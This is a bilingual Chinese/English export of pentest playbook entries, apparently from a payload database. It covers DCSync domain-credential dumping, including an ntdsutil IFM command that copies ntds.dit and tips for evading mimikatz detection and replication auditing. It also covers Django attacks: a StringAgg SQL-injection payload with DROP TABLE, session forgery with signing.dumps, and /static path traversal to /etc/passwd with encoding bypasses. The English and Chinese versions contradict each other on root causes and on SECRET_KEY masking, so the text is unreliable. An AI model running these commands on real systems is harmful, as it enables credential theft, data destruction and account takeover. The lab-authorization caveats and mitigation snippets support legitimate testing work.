analysis.en: DCSync Replication-Permission Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: DCSync 拉取的密码数据等同域口令库——验证 marker 账户后即毁输出；复制请求留 4662 审计，须在授权窗口执行。
opsecTips.en: DCSync output equals the domain password database — destroy it right after verifying the marker account, and run replication requests inside the authorized window since they leave 4662 audit events.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 规避 mimikatz 进程与特征：Linux 侧远程 DCSync 仅取 krbtgt；输出 NTLM/AES 哈希即成功。
description.en: Avoid mimikatz process signatures by pulling only krbtgt via remote DCSync from Linux; output NTLM/AES hashes confirm success.

wafBypass.command: ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\ifm" quit quit

description.zh: 规避 DRSUAPI 网络复制审计：用域控原生 IFM 备份落地 ntds.dit；目录中出现数据库文件即成功。
description.en: Land ntds.dit via the DC-native IFM backup instead of DRSUAPI network replication; the database file appearing in the directory confirms success.

description.zh: 以目录复制 API 的管理模块替代 mimikatz：输出含krbtgt 哈希字段即成功。
description.en: Pull the hash through the replication-API admin module instead of mimikatz; output containing krbtgt hash fields confirms success.

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_DCSYNC_ATTACK_E_1 与蓝队日志；成功时 dcsync 输出目标域 Administrator 的 NTLM 哈希。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_DCSYNC_ATTACK_E_1 with blue-team logs; dcsync returning the target-domain Administrator NTLM hash confirms success.

explanation.en: Describes how the parameter segment "/domain:domain.com" participates in this validation command.

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_DCSYNC_ATTACK_E_2 与蓝队日志；成功时 secretsdump 返回目标账户哈希，蓝队可见 4662 复制目录访问事件。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_DCSYNC_ATTACK_E_2 with blue-team logs; secretsdump returning target-account hashes with event 4662 replication access confirms success.

title.zh: 全量域哈希 CSV 导出

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_DCSYNC_ATTACK_E_3 与蓝队日志；成功时 /all /csv 输出全量域哈希 CSV。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_DCSYNC_ATTACK_E_3 with blue-team logs; the /all /csv run returning a full domain hash CSV confirms success.

title.zh: 读取域对象安全描述符

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_DCSYNC_ATTACK_E_4 与蓝队日志；成功时返回域对象 nTSecurityDescriptor，可核对 Replication 权限授予。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_DCSYNC_ATTACK_E_4 with blue-team logs; the domain object nTSecurityDescriptor returned for reviewing replication grants confirms success.

name.zh: Django 版本与安全配置回归

description.zh: 覆盖 Django 版本漏洞与配置回归验证：从 CVE-2020-7471 StringAgg 注入探测，到 DEBUG 页面配置提取与 signing 签名伪造，再到静态目录路径遍历，用于确认部署的安全配置缺口。
description.en: Covers Django version-vulnerability and configuration regression validation: from CVE-2020-7471 StringAgg injection probing through DEBUG-page configuration extraction and signing forgery to static-directory path traversal, confirming security-configuration gaps in deployments.

overview.zh: Django 版本与安全配置回归针对 Django 部署的配置缺口场景。覆盖 CVE-2020-7471 StringAgg 注入探测、DEBUG 页面配置提取、signing 签名伪造与静态目录路径遍历四类验证维度。
overview.en: The Django version and security-configuration regression targets configuration gaps in Django deployments. It covers four verification dimensions: CVE-2020-7471 StringAgg injection probing, DEBUG-page configuration extraction, signing forgery, and static-directory path traversal.

vulnerability.zh: 根因按维度不同：StringAgg 的 delimiter 参数未做 SQL 转义即拼接进聚合 SQL；DEBUG 开启使错误页暴露应用配置与调试信息（SECRET_KEY 等敏感项被掩码显示）；静态处理未规范化 ../ 导致目录穿越；密钥泄露后 signing 机制可被伪造。
vulnerability.en: Root causes differ by dimension: __contains lookup values are concatenated into StringAgg-generated SQL; DEBUG on leaks SECRET_KEY and database settings via error pages; static handling without ../ normalization allows traversal; and with the key leaked, the signing mechanism can be forged.

exploitation.zh: 按 Payload 列表顺序使用：先请求不存在路径触发 DEBUG 页，确认调试模式与配置暴露；拿到泄露密钥（需结合 .env/源码等其他渠道）后用第 3 步 signing.dumps 伪造会话值并以 loads 校验；再用第 1 步在 StringAgg 的 delimiter 夹带 SQL 片段验证注入；最后用第 4 步 curl --path-as-is 验证 /static 穿越。被拦截时改用路径编码变形。
exploitation.en: Use payloads in list order: request a nonexistent path to trigger the DEBUG page and confirm SECRET_KEY and database-setting leakage; with the key, forge session values via step 3's signing.dumps verified by loads; then test StringAgg injection with step 1's SQL fragments inside __contains values; finally verify /static traversal with step 4's curl --path-as-is. Use path-encoding variants when blocked.

mitigation.zh:
升级到修复 CVE-2020-7471（2.2.11+）的版本；CVE-2021-28658（3.1.9+）仅适用于 collectstatic/findstatic 对符号链接目录的处理，与运行期 /static URL 穿越无关；生产关闭 DEBUG，SECRET_KEY 改环境注入并轮换已泄露值；StringAgg delimiter 做白名单；静态服务限定根目录并规范化 ../。
    # settings.py
    DEBUG = False
    SECRET_KEY = os.environ['DJANGO_SECRET_KEY']
    # delimiter 白名单（CVE-2020-7471）
    if delimiter not in {',', ';', '|'}:
        raise ValueError('invalid delimiter')
    StringAgg('name', delimiter=delimiter)
mitigation.en: Disable DEBUG in production, move SECRET_KEY into secret management and rotate leaked keys, upgrade to versions fixing CVE-2020-7471 and CVE-2021-28658, and normalize static paths within a confined root. After the fix, replay steps 1-4 and confirm error pages leak nothing, signature checks reject forgeries, and traversal is denied.

title.zh: 触发 DEBUG 页提取配置

description.zh: 请求不存在的路径触发 Django 报错页，确认调试模式并提取路由、中间件、数据库引擎与主机白名单等配置信息；SECRET_KEY 等敏感项为掩码显示，需另寻泄露渠道。命中判据：报错页暴露调试与配置细节。
description.en: Request a missing path to pop the DEBUG page and lift SECRET_KEY/DATABASES. Success: secrets appear on the error page.

description.zh: 用泄露的 SECRET_KEY 以 signing.dumps 构造任意会话值，并通过 loads 检查。命中判据：伪造会话被服务端接受。
description.en: With SECRET_KEY, mint session values via signing.dumps that pass loads. Success: forged sessions are accepted.

attackChain.payload:
import django.core.signing as signing
signing.loads(session_value, key=SECRET_KEY)
fake_session = signing.dumps({"user_id": 1}, key=SECRET_KEY)

description.zh: 在 StringAgg 的 delimiter 参数中夹带 SQL 注释与语句片段，利用参数拼接执行。命中判据：注入语句影响聚合结果或触发数据库报错。
description.en: Tuck SQL comment fragments into the StringAgg delimiter argument. Success: injected SQL alters the aggregate result or raises a database error.

attackChain.payload:
# CVE-2020-7471
from django.contrib.postgres.aggregates import StringAgg
Model.objects.annotate(x=StringAgg('name', delimiter="-' DROP TABLE users;--"))

description.zh: 以 --path-as-is 请求 /static 加 ../ 穿越序列读取系统文件。命中判据：读到 /etc/passwd 内容。
description.en: Request /static with ../ sequences using --path-as-is. Success: /etc/passwd content is returned.

attackChain.payload:
# 静态目录路径遍历通用探针（对照 CVE-2021-28658 时应验证 collectstatic 对符号链接目录的处理，而非运行期 URL 穿越）
GET /static/../../../../etc/passwd
curl --path-as-is http://{LAB_APP}/static/../../../../etc/passwd

title.zh: 编码变形绕过路径过滤

description.zh: 穿越序列被过滤时改用双重编码与过度编码 UTF-8 变形提交请求。命中判据：变形路径成功读取目标文件内容。
description.en: When ../ is filtered, switch to double-encoded and overlong UTF-8 variants. Success: a mutated path reads files.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 Django 版本与安全配置回归 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Django Version and Security-Configuration Regression are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

analysis.zh: Django 版本与安全配置回归只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Django Version and Security-Configuration Regression is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: CVE-2020-7471 探测涉及聚合查询——只对实验库执行；signing 伪造的令牌验证后不保留。
opsecTips.en: The CVE-2020-7471 probe issues aggregate queries — run them against the lab database only, and discard forged signing tokens after verification.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

description.zh: 对同一遍历路径分别施加单次编码、双重编码与 UTF-8 超长编码，验证仅做一次解码的黑名单拦截可被绕过。
description.en: Apply single encoding, double encoding, and UTF-8 overlong encoding to the same traversal path, verifying blacklists that decode once can be evaded.

explanation.zh: UTF-8 超长编码的 /，部分解析器会接受
explanation.en: UTF-8 overlong encoding of /, accepted by some parsers

Model.objects.annotate(x=StringAgg('name', delimiter="-' DROP TABLE users;--"))

description.zh: 在 StringAgg 聚合的 delimiter 参数中夹带 SQL 注释与语句片段，验证分隔符被直接拼接进聚合 SQL 而非参数化转义。
description.en: Embed SQL comment and statement fragments inside __contains lookup values, verifying lookup arguments are concatenated into SQL instead of being parameterized.

title.zh: 触发 DEBUG 页面提取配置
title.en: Trigger the DEBUG page and extract configuration

execution.command:
curl -s http://{LAB_APP}/nonexistent
# DEBUG 页面泄露清单
- SECRET_KEY
- DATABASES
- ALLOWED_HOSTS

description.zh: 请求不存在的路径触发 Django DEBUG 404 调试页确认调试模式开启；进一步触发未捕获异常（500）可在 Settings 帧看到 ALLOWED_HOSTS、中间件、数据库引擎等配置，但 SECRET_KEY 等敏感项会被掩码显示，需结合 .env/源码泄露等其他渠道获取。
description.en: Request a nonexistent path to raise the Django DEBUG error page and confirm the leak of SECRET_KEY, database settings, and ALLOWED_HOSTS.

title.zh: 伪造 Django signing 签名

execution.command:

signing.loads(session_value, key=SECRET_KEY)
fake_session = signing.dumps({"user_id": 1}, key=SECRET_KEY)

description.zh: 拿到 SECRET_KEY 后用 signing.dumps 构造任意会话值并以 loads 校验通过，验证签名机制在密钥泄露后可被伪造。
description.en: With SECRET_KEY in hand, craft arbitrary session values with signing.dumps and pass loads verification, proving signatures are forgeable once the key leaks.

title.zh: 静态目录路径遍历验证

execution.command:
# 静态目录路径遍历通用探针（对照 CVE-2021-28658 时应验证 collectstatic 对符号链接目录的处理，而非运行期 URL 穿越）
GET /static/../../../../etc/passwd
curl --path-as-is http://{LAB_APP}/static/../../../../etc/passwd

description.zh: 以 GET 与 curl --path-as-is 请求穿越 /static 的相对路径，验证服务端不规范化 ../ 时可读取 /etc/passwd。
